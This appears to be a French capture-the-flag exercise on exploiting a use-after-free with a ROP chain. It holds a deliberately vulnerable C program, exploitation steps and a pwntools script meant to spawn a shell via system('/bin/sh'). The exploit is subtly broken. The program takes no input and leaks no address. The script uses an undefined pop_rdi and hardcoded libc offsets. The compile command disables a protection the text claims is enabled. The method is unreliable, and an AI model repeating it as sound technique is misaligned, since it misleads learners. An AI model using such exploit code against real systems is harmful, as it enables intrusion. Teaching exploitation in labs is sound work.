Challenge : Exploitation d'une Use-After-Free avec ROP
Description du challenge

Le programme suivant contient une vulnérabilité de type use-after-free. Votre objectif est d'exploiter cette vulnérabilité pour exécuter un shell en utilisant une chaîne ROP. Le binaire est compilé avec des protections comme ASLR, NX, et PIE, ce qui rend l'exploitation plus difficile.
Code vulnérable
c
Copy

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct User {
    char name[32];
    void (*printName)();
};

void printUserName(struct User *user) {
    printf("Nom d'utilisateur: %s\n", user->name);
}

void secretFunction() {
    printf("Fonction secrète exécutée !\n");
    system("/bin/sh");
}

int main() {
    struct User *user1, *user2;

    user1 = (struct User *)malloc(sizeof(struct User));
    user2 = (struct User *)malloc(sizeof(struct User));

    strcpy(user1->name, "User1");
    user1->printName = printUserName;

    strcpy(user2->name, "User2");
    user2->printName = printUserName;

    free(user1);
    free(user2);

    // Use-After-Free ici
    strcpy(user1->name, "Exploit");
    user1->printName();

    return 0;
}

Compilation

Compilez le binaire avec les protections activées pour augmenter la difficulté :
bash
Copy

gcc -fno-stack-protector -o use_after_free_rop use_after_free_rop.c

Exploitation
Étape 1 : Identifier la vulnérabilité

La vulnérabilité se trouve dans la ligne user1->printName(); après que user1 a été libéré. Cela permet à un attaquant de contrôler le pointeur de fonction printName en réallouant la mémoire libérée.
Étape 2 : Contrôler le pointeur de fonction

En utilisant la vulnérabilité use-after-free, nous pouvons réallouer la mémoire libérée avec des données contrôlées, ce qui nous permet de rediriger l'exécution vers une chaîne ROP.
Étape 3 : Fuite d'adresses

Pour contourner ASLR et PIE, nous devons fuiter une adresse mémoire. Cela peut être fait en utilisant la fonction printUserName pour afficher une adresse de la GOT (Global Offset Table).
Étape 4 : Construire la chaîne ROP

Utilisez des gadgets disponibles dans le binaire pour construire une chaîne ROP. Par exemple :

    Utilisez un gadget pop rdi; ret pour passer l'adresse de /bin/sh à system().

    Appelez system() pour exécuter un shell.

Étape 5 : Exploit final

Combinez tout cela pour créer un exploit qui :

    Fuit des adresses pour contourner ASLR et PIE.

    Contrôle le pointeur de fonction pour rediriger l'exécution vers une chaîne ROP.

    Exécute system("/bin/sh").


```python
from pwn import *

# Connexion au binaire
p = process('./use_after_free_rop')

# Fuite d'adresse pour contourner ASLR et PIE
p.recvuntil("Nom d'utilisateur: ")
leak = p.recvline().strip()
libc_base = int(leak, 16) - 0x21b97  # Offset de printf dans libc
system_addr = libc_base + 0x4f550    # Offset de system dans libc
bin_sh_addr = libc_base + 0x1b3e1a   # Offset de "/bin/sh" dans libc

# Construction de la chaîne ROP
rop_chain = [
    pop_rdi,        # Gadget pop rdi; ret
    bin_sh_addr,    # Adresse de "/bin/sh"
    system_addr     # Adresse de system()
]

# Envoi du payload
payload = b"A" * 32 + b"".join(p64(addr) for addr in rop_chain)
p.sendline(payload)

# Interaction avec le shell
p.interactive()
```

